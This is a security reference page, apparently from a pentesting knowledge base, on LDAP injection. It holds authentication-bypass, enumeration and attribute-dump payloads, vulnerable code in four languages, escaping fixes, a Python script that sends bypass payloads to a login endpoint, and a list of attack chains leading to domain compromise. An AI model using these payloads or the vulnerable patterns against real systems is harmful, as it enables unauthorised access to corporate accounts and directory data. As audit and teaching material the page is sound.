# LDAP Injection

**Tags:** #critical #ldap #active-directory #auth-bypass #enterprise
**OWASP:** A03:2021 Injection
**CVSS Base:** 9.8 (Critical → corporate authentication bypass)

---

## 📖 What is it

Enterprise applications that integrate with Active Directory or LDAP for authentication are vulnerable when user input is concatenated into LDAP queries without sanitization. This allows complete authentication bypass and dumping of all directory objects.

---

## 🔍 `grep_search` Tactics

```
ldap_search(
ldap_bind(
LdapConnection
DirectorySearcher
ldap.search(
ActiveDirectory
ldap.open(
openldap
python-ldap
ldap3
```

**Check:** is input sanitized with `ldap_escape()` or equivalent before any LDAP operation?

---

## 🎯 LDAP Syntax Reference

```
# Basic LDAP filter
(&(uid=USERNAME)(password=PASSWORD))

# Operator meanings:
(&   AND (all criteria must be true)
(|   OR (any criterion is true)
(!   NOT (negates the criterion)
*    wildcard (any value)

# Common attributes
uid           user identifier
cn            common name (full name)
sn            surname
mail          email
memberOf      groups the user belongs to
userPassword  password (hash)
```

---

## 💣 Exploit Payloads

### Classic Authentication Bypass

```
Username: *)(uid=*))(|(uid=*
Password: anything
```

**Resulting LDAP query:**
```
(&(uid=*)(uid=*))(|(uid=*)(password=anything))

→ simplified:
(&(uid=ANY_UID)(1=1))   → always true

→ Authenticates as the first user in the directory (usually admin)
```

---

### User Enumeration

```
Username: admin)(|(uid=*
Password: x

→ (&(uid=admin)(|(uid=*)(password=x))
   uid=* returns all existing users
```

**If the response varies (size, timing) based on user existence:**
```
Username: admi*       → tests if someone with UID starting with 'admi' exists
Username: admin       → tests exact user 'admin'
Username: administr*  → tests a longer prefix
```

---

### Sensitive Attribute Dump

```
# If the searched field is "mail" and filters by the injected username:
Username: *)(|(mail=*
# → the query returns ALL emails in the directory
```

---

### Bypass via Special Characters

```
LDAP special characters: ( ) \ * NUL \0 /

Injection via:
*                → wildcard → any password
)(uid=*))(& (uid=admin
)(|(uid=*
\00              → null byte can truncate filters
```

---

## 💣 Vulnerable Patterns by Language

### PHP

```php
//  VULNERABLE — direct concatenation
$username = $_POST['username'];
$password = $_POST['password'];

$filter = "(&(uid=$username)(userPassword=$password))";
$result = ldap_search($ldapConn, $baseDN, $filter);
```

### Python — python-ldap

```python
#  VULNERABLE
import ldap

username = request.form['username']
password = request.form['password']

filter_str = f"(&(uid={username})(userPassword={password}))"
result = conn.search_s(base_dn, ldap.SCOPE_SUBTREE, filter_str)
```

### Java

```java
//  VULNERABLE
String username = request.getParameter("username");
String filter = "(&(uid=" + username + ")(objectClass=person))";
NamingEnumeration results = ctx.search(base, filter, new SearchControls());
```

### C# — DirectorySearcher

```csharp
//  VULNERABLE
string username = Request.Form["username"];
DirectorySearcher ds = new DirectorySearcher();
ds.Filter = "(&(sAMAccountName=" + username + ")(objectClass=user))";
SearchResult result = ds.FindOne();
```

---

## 🛡️ Fix

### PHP — `ldap_escape()`

```php
//  CORRECT
$username = ldap_escape($_POST['username'], '', LDAP_ESCAPE_FILTER);
$password = ldap_escape($_POST['password'], '', LDAP_ESCAPE_FILTER);
$filter = "(&(uid=$username)(userPassword=$password))";
```

### Python — ldap3 with escaping

```python
#  CORRECT — ldap3
from ldap3 import Server, Connection, ALL
from ldap3.utils.conv import escape_filter_chars

username = escape_filter_chars(request.form['username'])
password = escape_filter_chars(request.form['password'])

filter_str = f"(&(uid={username})(userPassword={password}))"
conn.search(base_dn, filter_str, attributes=['cn', 'mail'])
```

### General Escaping Rules

```
Characters to escape in LDAP filters:
(  → \28
)  → \29
*  → \2a
\  → \5c
\0 (NUL) → \00
/  → \2f (in DNs)
```

---

## 🧪 Validation Script

```python
# .tmp/validate_ldap_injection.py
import requests

TARGET = "http://target.com"
ENDPOINT = "/api/login"

PAYLOADS = [
    # Classic bypass
    {"username": "*", "password": "*"},
    {"username": "*)(uid=*))(|(uid=*", "password": "x"},
    {"username": "admin)(|(uid=*", "password": "x"},
    # Wildcard password
    {"username": "admin", "password": "*"},
    # Null byte
    {"username": "admin\x00", "password": "test"},
]

for p in PAYLOADS:
    r = requests.post(f"{TARGET}{ENDPOINT}", json=p, timeout=10)
    if r.status_code == 200 and ('token' in r.text or 'session' in r.text or 'success' in r.text.lower()):
        print(f"[🔴 CRITICAL] LDAP Injection Auth Bypass: {p}")
        print(f"  Response: {r.text[:200]}")
    else:
        print(f"[ok] {p} ({r.status_code})")
```

---

## 🔗 Chain Exploits

```
LDAP Injection Auth Bypass → Login as corporate admin → Full system access
LDAP Injection + directory dump → AD password hashes → Lateral movement on the network
LDAP Injection → enumerate privileged group members → Targeted phishing
LDAP Injection + AD + Kerberoasting → Full domain compromise
LDAP Injection Time-Based → Exfiltrate attributes bit by bit via timing
```

---

## 📌 References
- [[nosql-injection]]
- [[sql-injection-sqli]]
- [[authentication-session-management]]
- [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [HackTricks LDAP Injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection)